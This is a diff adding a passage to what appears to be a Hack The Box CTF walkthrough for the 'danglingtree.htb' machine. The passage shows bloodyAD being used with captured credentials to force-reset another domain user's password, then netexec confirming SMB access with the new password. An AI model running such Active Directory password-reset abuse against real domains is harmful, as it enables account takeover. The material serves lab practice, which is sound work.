@@ -1714,3 +1714,15 @@ binarysize:            36
 ╰─                                                                                                                      ─╯
 
 ```
+
+``` bash
+
+❯ bloodyAD -u alex.o -p 'SunsetMountainPeak@2025' -d danglingtree.htb --dc-ip 10.129.82.45 set password jake.h 'Password123!'
+[+] Password changed successfully!
+❯ netexec smb 10.129.82.45 -u jake.h -p 'Password123!'
+SMB         10.129.82.45    445    DC               [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC) (domain:danglingtree.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.82.45    445    DC               [+] danglingtree.htb\jake.h:Password123!
+╭─ ~/hacking/ctf/htb/medium/danglintree/recon                                                                     ✔ │ ≡ ─╮
+╰─                                                                                                                      ─╯
+
+```
